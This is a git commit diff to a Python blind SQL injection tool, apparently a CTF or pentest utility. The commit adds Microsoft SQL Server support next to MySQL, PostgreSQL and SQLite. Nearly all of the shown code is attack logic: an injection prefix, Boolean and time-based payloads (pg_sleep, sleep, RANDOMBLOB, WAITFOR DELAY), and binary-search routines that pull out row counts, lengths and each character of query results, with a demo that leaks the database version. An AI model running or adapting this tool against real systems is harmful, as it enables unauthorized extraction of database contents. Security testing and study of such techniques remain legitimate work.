670735b0eb78e226c8fed739be9df413987831b2
physics-sp <physics-sp@protonmail.com>
2021-05-21 19:55:52 -0300

    add support for MSSQL Boolean based

--- MySQLi.py
+++ MySQLi.py
@@ -17,6 +17,7 @@ class Database(Enum):
     MySQL = 1
     PostgreSQL = 2
     SQLite = 3
+    MSSQL = 4
 
 
 class SQLiType(Enum):
@@ -28,6 +29,7 @@ class SQLiType(Enum):
 database = Database.MySQL
 # database = Database.PostgreSQL
 # database = Database.SQLite
+# database = Database.MSSQL
 sqlitype = SQLiType.Boolean
 # sqlitype = SQLiType.Time
 PRE = "' or"
@@ -37,29 +39,62 @@ sleep_time = 2
 
 
 if database == Database.PostgreSQL:
-    SELECT_ROW = lambda row_num: f'limit 1 offset {row_num}'
-    SUBSTRING = 'substring'
+    SELECT_ROW = lambda query,row_num: f'{query} limit 1 offset {row_num}'
     ADD_SLEEP = lambda query: f'({query} AND 1=(select 1 from pg_sleep({sleep_time})))'
+    LENGTH = lambda query,number: f"(select length({get_column_name(query)}) from ({query}) as T)>{number}"
+    NUM_ROWS = lambda query,number: f'(select count(*) from ({query}) as T) > {middle}'
+    SUBSTRING = 'substring'
     ASCII = 'ascii'
-    VERSION = 'version'
+    VERSION = f'select {SUBSTRING}(version(),1,10) as leak'
     DBNAME ='PostgreSQL'
 elif database == Database.MySQL:
-    SELECT_ROW = lambda row_num: f'limit {row_num},1'
-    SUBSTRING = 'mid'
+    SELECT_ROW = lambda query,row_num: f'{query} limit {row_num},1'
     ADD_SLEEP = lambda query: f'if({query},sleep({sleep_time}),0)'
+    LENGTH = lambda query,number: f"(select length({get_column_name(query)}) from ({query}) as T)>{number}"
+    NUM_ROWS = lambda query,number: f'(select count(*) from ({query}) as T) > {middle}'
+    SUBSTRING = 'mid'
     ASCII = 'ascii'
-    VERSION = 'version'
+    VERSION = f'select {SUBSTRING}(version(),1,10) as leak'
     DBNAME = 'MySQL'
 elif database == Database.SQLite:
-    SELECT_ROW = lambda row_num: f'limit {row_num-1},1'
-    SUBSTRING = 'substr'
+    SELECT_ROW = lambda query,row_num: f'{query} limit {row_num-1},1'
     ADD_SLEEP = lambda query: f'{query} and 1=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB({sleep_time}00000000/2))))'
+    LENGTH = lambda query,number: f"(select length({get_column_name(query)}) from ({query}) as T)>{number}"
+    NUM_ROWS = lambda query,number: f'(select count(*) from ({query}) as T) > {middle}'
+    SUBSTRING = 'substr'
     ASCII = 'unicode'
-    VERSION = 'sqlite_version'
+    VERSION = f'select {SUBSTRING}(sqlite_version(),1,10) as leak'
     DBNAME = 'SQLite'
+elif database == Database.MSSQL:
+    # why so complicated!?
+    def mssql_select_row(query, row_num):
+        q_data = parse_query(query)
+        assert q_data['has_from']
+        where_added = f"{q_data['col_name']} not in (select top {row_num} {q_data['col_name']} from {q_data['table']} order by {q_data['col_name']}) order by {q_data['col_name']}"
+        if q_data['has_where']:
+            where = f"({q_data['where']}) and {where_added}"
+        else:
+            where = where_added
+        return f"select top 1 {q_data['selection']} from {q_data['table']} where {where}"
+    SELECT_ROW = mssql_select_row
+    # ADD_SLEEP = lambda query: f'IF({query}) WAITFOR DELAY \'0:0:{sleep_time}\''
+    LENGTH = lambda query,number: f'UNICODE(SUBSTRING(({query}),{number},1))>1'
+    def mssql_num_rows(query, number):
+        q_data = parse_query(query)
+        query = query.replace(q_data['selection'], 'count(*)')
+        return f'({query})>{number}'
+    NUM_ROWS = mssql_num_rows
+    SUBSTRING = 'substring'
+    ASCII = 'unicode'
+    VERSION = f'select {SUBSTRING}(@@version,1,20) as leak'
+    DBNAME = 'MSSQL'
 else:
     exit('invalid database type')
 compare_value = None
+
+
+if database == Database.MSSQL and sqlitype == SQLiType.Time:
+    exit('MSSQL only supports Boolean based SQLi, sorry!')
 
 # printable chars:
 # 9, 10, 13, 11, 12
@@ -127,28 +162,48 @@ def query_equals_true(payload):
     return check_if_true(r, time_elapsed)
 
 
-def get_column_name(query):
-    match = re.search(r'select (.+?)( from|$)', query, re.IGNORECASE | re.MULTILINE)
+def parse_query(query):
+    parsed = {}
+    # get the selection
+    match = re.search(r'select (.+?)( from|$)', query, re.IGNORECASE)
     if match is None:
         exit('The query needs to start with SELECT')
-    selected = match.group(1)
-    match = re.search(r'.*? as (\w+)', selected, re.IGNORECASE)
+    parsed['selection'] = match.group(1).strip()
+    # get the name of the column
+    match = re.search(r'.*? as (\w+)', parsed['selection'], re.IGNORECASE)
     if match is not None:
-        col_name = match.group(1)
+        parsed['col_name'] = match.group(1).strip()
     else:
-        match = re.search(r'^[a-zA-Z_][a-zA-Z0-9_]*$', selected)
+        match = re.search(r'^[a-zA-Z_][a-zA-Z0-9_]*$', parsed['selection'])
         if match is None:
             print('column name not recognized')
             print('make sure you only include one column')
-            print('consider including an \'as aliasname\' on the target column')
+            print('including an \'as aliasname\' on the target column might help')
             exit()
-        col_name = selected
-    return col_name
+        parsed['col_name'] = parsed['selection']
+    # get the table, if any
+    match = re.search(r'select .+? from (.+?)(?: where|$)', query, re.IGNORECASE)
+    parsed['has_from'] = match is not None
+    if parsed['has_from']:
+        parsed['table'] = match.group(1).strip()
+        # get the where part, if any
+        match = re.search(r'select .+? from .+? where (.+)', query, re.IGNORECASE)
+        parsed['has_where'] = match is not None
+        if parsed['has_where']:
+            parsed['where'] = match.group(1).strip()
+    return parsed
+
+
+def get_column_name(query):
+    return parse_query(query)['col_name']
 
 
 def get_length(query, num_row):
-    if is_multirow(query):
-        query = f'{query} {SELECT_ROW(num_row)}'
+    q_data = parse_query(query)
+    col_name = q_data['col_name']
+
+    if q_data['has_from']:
+        query = SELECT_ROW(query, num_row)
 
     # check that the query actually returns something
     null_test = f"EXISTS({query})"
@@ -157,7 +212,6 @@ def get_length(query, num_row):
         return 0
 
     # check the it doesn't return NULL
-    col_name = get_column_name(query)
     null_test = f"1 = (select count(1) from ({query}) as T where {col_name} IS NOT NULL)"
     if query_equals_true(null_test) is False:
         print('the query returns NULL')
@@ -168,7 +222,7 @@ def get_length(query, num_row):
     end = 5000  # this could be larger
     while start != end:
         middle = (end + start) // 2
-        payload = f"(select length({col_name}) from ({query}) as T) > {middle}"
+        payload = LENGTH(query, middle)
         if query_equals_true(payload):
             start = middle + 1
         else:
@@ -181,7 +235,7 @@ def get_num_rows(query):
     end = 5000  # this could be larger
     while start != end:
         middle = (end + start) // 2
-        payload = f"(select count(*) from ({query}) as totalCount) > {middle}"
+        payload = NUM_ROWS(query, middle)
         if query_equals_true(payload):
             start = middle + 1
         else:
@@ -189,17 +243,13 @@ def get_num_rows(query):
     return start
 
 
-def is_multirow(query):
-    match = re.search(r'select .*? from', query, re.IGNORECASE)
-    return match is not None
-
-
 def leak_query(query):
     set_compare_value()
     print(f'query: {query}')
+    q_data = parse_query(query)
     leaks = []
-    multirow = is_multirow(query)
-    if multirow:
+    has_table = q_data['has_from']
+    if has_table:
         num_rows = get_num_rows(query)
     else:
         num_rows = 1
@@ -215,9 +265,8 @@ def leak_query(query):
                 end = end_char
                 while start != end:
                     middle = (end + start) // 2
-                    # check if the ascii code of the character i in the row num_row is greater than midde
-                    if multirow:
-                        q = f'{query} {SELECT_ROW(num_row)}'
+                    if has_table:
+                        q = SELECT_ROW(query, num_row)
                     else:
                         q = query
                     payload = f"{ASCII}({SUBSTRING}(({q}), {i}, 1)) > {middle}"
@@ -227,30 +276,31 @@ def leak_query(query):
                         end = middle
                 leak += chr(start)
                 print(f'leaking row {num_row}: {leak}', end='\r')
-            print(f'leaked row {num_row}: {leak} ')
-        if length > 0:
-            leaks.append(leak)
+
+            print(f'leaked row {num_row}: {leak}  ')
+            if length > 0:
+                leaks.append(leak)
     except KeyboardInterrupt:
         print('')
     return leaks
 
 
 def main():
-    print('- -- Blind SQL injection script -- -\n')
+    print('\033[1m\033[94m Blind SQL injection script \033[0m\033[0m\n')
     t = 'Boolean' if sqlitype == SQLiType.Boolean else 'Time'
     print(f'exploiting: {DBNAME}, {t} based')
 
     start = time.time()
 
     query = input('enter query: ')
-    sys.stdout.buffer.write(b"\033[F")
-    sys.stdout.buffer.write(b"\033[K")
+    sys.stdout.buffer.write(b"\033[F\033[K")
     if query == '':
-        query = f'select {SUBSTRING}({VERSION}(),1,10) as leak'
+        query = VERSION
         print('using demo query\n')
 
     # exploit!
     leak = leak_query(query)
+
     if len(leak) > 0:
         with open('output.txt', 'a') as f:
             f.write(f'{query}\n')
